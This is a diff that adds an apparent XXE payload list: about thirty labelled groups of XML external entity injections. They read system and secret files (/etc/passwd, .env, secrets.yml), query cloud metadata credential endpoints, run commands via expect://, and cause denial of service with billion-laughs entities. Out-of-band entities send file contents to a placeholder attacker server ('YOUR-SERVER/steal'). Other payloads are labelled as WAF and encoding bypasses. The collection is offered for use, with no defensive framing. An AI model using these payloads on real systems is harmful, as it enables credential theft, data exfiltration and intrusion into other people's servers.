@@ -1,0 +1,120 @@
+<!-- ==================== PART 1: BASIC FILE READ ==================== -->
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///proc/self/environ"> ]>
+
+<!-- ==================== PART 2: BLIND XXE WITH OOB ==================== -->
+<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://YOUR-SERVER/xxe.dtd"> %xxe; ]>
+<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "https://YOUR-SERVER/xxe.dtd"> %xxe; ]>
+<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "//YOUR-SERVER/xxe.dtd"> %xxe; ]>
+
+<!-- ==================== PART 3: ERROR-BASED XXE ==================== -->
+<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> <!ENTITY % error "<!ENTITY error SYSTEM 'file:///nonexistent/%xxe;'>"> %error; ]>
+<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://YOUR-SERVER/xxe.dtd"> %xxe; ]>
+
+<!-- ==================== PART 4: PHP WRAPPERS ==================== -->
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=../config/database.php"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=../../.env"> ]>
+
+<!-- ==================== PART 5: SSRF & METADATA ==================== -->
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://localhost:8080/admin"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://127.0.0.1:80"> ]>
+
+<!-- ==================== PART 6: EXPECT RCE (PHP) ==================== -->
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "expect://id"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "expect://ls -la"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "expect://cat /etc/passwd"> ]>
+
+<!-- ==================== PART 7: XINCLUDE BYPASS ==================== -->
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></foo>
+<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///c:/windows/win.ini" parse="text"/></root>
+
+<!-- ==================== PART 8: SVG XXE ==================== -->
+<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><xml xmlns=""><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></xml></foreignObject></svg>
+<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>
+
+<!-- ==================== PART 9: SOAP/XMLRPC XXE ==================== -->
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://YOUR-SERVER/xxe.dtd"> %dtd;]><xxx/>]]></foo></soap:Body>
+<methodCall><methodName>test</methodName><params><param><value><struct><member><name><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><value>&xxe;</value></name></member></struct></value></param></params></methodCall>
+
+<!-- ==================== PART 10: JAR/WAR PROTOCOL (Java) ==================== -->
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "jar:http://YOUR-SERVER/xxe.jar!/xxe.dtd"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "https://YOUR-SERVER/xxe.jar!/xxe.dtd"> ]>
+
+<!-- ==================== PART 11: NETWORK PROTOCOLS ==================== -->
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "ftp://YOUR-SERVER:21/xxe"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "gopher://YOUR-SERVER:8080/_GET /xxe HTTP/1.0"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "dict://YOUR-SERVER:11211/xxe"> ]>
+
+<!-- ==================== PART 12: DOS (BILLION LAUGHS) ==================== -->
+<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">]><root>&lol5;</root>
+
+<!-- ==================== PART 13: ENCODED BYPASS ==================== -->
+<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>
+<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://YOUR-SERVER/xxe.dtd"> %xxe; ]>
+
+<!-- ==================== PART 14: CDATA ESCAPE ==================== -->
+<!DOCTYPE test [<!ENTITY % start "<![CDATA["> <!ENTITY % end "]]>"> <!ENTITY % xxe SYSTEM "file:///etc/passwd"> <!ENTITY % all "<!ENTITY contents '%start;%xxe;%end;'>"> %all; ]><root>&contents;</root>
+
+<!-- ==================== PART 15: MULTI-PLATFORM ==================== -->
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> <!ENTITY xxe2 SYSTEM "file:///c:/windows/win.ini"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php"> <!ENTITY xxe2 SYSTEM "expect://id"> ]>
+
+<!-- ==================== PART 16: PARAMETER ENTITIES OOB ==================== -->
+<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://YOUR-SERVER/xxe.dtd"> %xxe; ]>
+<!ENTITY % data SYSTEM "file:///etc/passwd"><!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://YOUR-SERVER/steal?data=%data;'>">%param1;%exfil;
+
+<!-- ==================== PART 17: HTML ENTITY BYPASS ==================== -->
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"> ]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;
+
+<!-- ==================== PART 18: UTF-16 BYPASS ==================== -->
+<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
+
+<!-- ==================== PART 19: WAF BYPASS SPACELESS ==================== -->
+<!DOCTYPE test[<!ENTITY xxe SYSTEM"file:///etc/passwd">]>
+<!DOCTYPE test[<!ENTITY%xxe SYSTEM"http://YOUR-SERVER/xxe.dtd">%xxe;]>
+
+<!-- ==================== PART 20: ADVANCED OOB WITH FTP ==================== -->
+<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "ftp://YOUR-SERVER:2121/xxe.dtd"> %xxe; ]>
+
+<!-- ==================== PART 21: DNS EXFILTRATION ==================== -->
+<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://YOUR-SERVER/xxe.dtd"> %xxe; ]>
+<!ENTITY % data SYSTEM "file:///etc/passwd"><!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://%data;.YOUR-SERVER/'>">%param1;%exfil;
+
+<!-- ==================== PART 22: MULTI-STAGE OOB ==================== -->
+<!DOCTYPE test [ <!ENTITY % stage1 SYSTEM "http://YOUR-SERVER/stage1.dtd"> %stage1; ]>
+<!ENTITY % data SYSTEM "file:///etc/passwd"><!ENTITY % stage2 "<!ENTITY exfil SYSTEM 'http://YOUR-SERVER/steal?data=%data;'>">%stage2;%exfil;
+
+<!-- ==================== PART 23: XXE IN JSON (If JSON parser supports XML) ==================== -->
+{"xml":"<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"}
+
+<!-- ==================== PART 24: XXE IN PARAMETER ==================== -->
+parameter=<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
+
+<!-- ==================== PART 25: ULTIMATE POLYGLOT ==================== -->
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><root>test</root>
+
+<!-- ==================== PART 26: NO ROOT ELEMENT BYPASS ==================== -->
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://YOUR-SERVER/xxe"> ]>
+
+<!-- ==================== PART 27: ENTITY INJECTION IN ATTRIBUTE ==================== -->
+<root value="&xxe;"/>
+<element attr="&xxe;"/>
+
+<!-- ==================== PART 28: XXE WITH BASE64 (For binary files) ==================== -->
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"> ]>
+
+<!-- ==================== PART 29: XXE WITH GZIP (For large files) ==================== -->
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "compress.zlib://file:///etc/passwd"> ]>
+
+<!-- ==================== PART 30: 2026 LATEST - CVE BASED ==================== -->
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/user-data/"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///proc/self/cwd/.env"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///app/config/secrets.yml"> ]>
